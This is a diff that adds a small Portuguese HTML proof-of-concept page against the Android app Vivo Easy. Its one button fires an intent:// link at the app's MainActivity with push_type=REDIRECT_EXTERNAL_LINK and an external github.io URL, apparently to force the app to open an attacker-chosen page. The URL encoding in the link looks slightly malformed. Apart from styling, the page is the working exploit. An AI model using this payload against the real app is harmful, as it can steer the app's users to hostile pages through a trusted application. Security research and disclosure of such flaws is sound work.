@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PoC — Vivo Easy Intent</title>
+  <style>
+    :root {
+      color-scheme: light dark;
+      font-family: system-ui, sans-serif;
+    }
+
+    body {
+      display: grid;
+      min-height: 100vh;
+      margin: 0;
+      place-items: center;
+      background: #f4f1f8;
+      color: #22172b;
+    }
+
+    main {
+      width: min(34rem, calc(100% - 3rem));
+      padding: 2rem;
+      border: 1px solid #d8cce2;
+      border-radius: 1rem;
+      background: #fff;
+      box-shadow: 0 1rem 3rem rgb(60 20 80 / 12%);
+      text-align: center;
+    }
+
+    a {
+      display: inline-block;
+      margin-top: 1rem;
+      padding: 0.9rem 1.25rem;
+      border-radius: 0.65rem;
+      background: #660099;
+      color: #fff;
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    code {
+      overflow-wrap: anywhere;
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <!-- <img data-component="Avatar" class="prc-Avatar-Avatar-0xaUi" alt="@Lakr233" width="150" height="100" data-testid="github-avatar" src="https://substackcdn.com/image/fetch/$s_!687v!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa4b8647a-09e8-4576-95de-e622dcc38d72_1280x720.jpeg" style="--avatarSize-regular: 32px;">
+    <h1>PoC de Intent</h1>  -->
+    <p>
+      O botão envia <code>push_type=REDIRECT_EXTERNAL_LINK</code> e
+      <code>push_external_link</code> para a <code>MainActivity</code> do
+      Vivo Easy.
+    </p>
+    <a href="intent://open/#Intent;scheme=vivoeasy;package=br.com.vivo.vivoeasy;action=android.intent.action.VIEW;S.push_external_link=https%3A%2F%19t0u7.github.io/o.html;S.push_type=REDIRECT_EXTERNAL_LINK;end">
+      Abrir Vivo Easy
+    </a>
+  </main>
+</body>
+</html>
